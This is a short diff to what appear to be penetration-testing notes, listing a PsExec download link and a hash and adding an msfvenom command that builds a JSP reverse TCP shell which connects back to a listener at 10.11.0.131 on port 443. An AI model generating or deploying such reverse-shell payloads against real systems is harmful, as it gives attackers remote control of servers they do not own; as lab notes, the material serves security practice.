@@ -40,3 +40,8 @@ https://docs.microsoft.com/zh-tw/sysinternals/downloads/psexec
 
 
 AAFDC23870ECBCD3D557B6423A8982134E17927E 
+
+
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.131 LPORT=443 -f raw > /root/Desktop/shell.jsp
+
